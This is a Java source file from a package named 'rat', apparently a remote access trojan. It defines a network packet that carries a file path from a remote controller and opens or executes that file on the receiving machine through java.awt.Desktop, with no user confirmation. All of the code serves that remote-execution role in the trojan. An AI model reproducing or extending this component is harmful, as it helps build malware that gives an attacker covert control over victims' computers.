package de.sogomn.rat.packet;

import java.awt.Desktop;
import java.awt.Desktop.Action;
import java.io.File;
import java.io.IOException;

import de.sogomn.rat.ActiveConnection;

public final class ExecuteFilePacket implements IPacket {
	
	private String path;
	
	public ExecuteFilePacket(final String path) {
		this.path = path;
	}
	
	public ExecuteFilePacket() {
		this("");
	}
	
	@Override
	public void send(final ActiveConnection client) {
		client.writeUTF(path);
	}
	
	@Override
	public void receive(final ActiveConnection client) {
		path = client.readUTF();
	}
	
	@Override
	public void execute(final ActiveConnection client) {
		final boolean desktopSupported = Desktop.isDesktopSupported();
		final File file = new File(path);
		
		if (desktopSupported && file.exists()) {
			final Desktop desktop = Desktop.getDesktop();
			final boolean canOpen = desktop.isSupported(Action.OPEN);
			
			if (canOpen) {
				try {
					desktop.open(file);
				} catch (final IOException ex) {
					ex.printStackTrace();
				}
			}
		}
	}

}
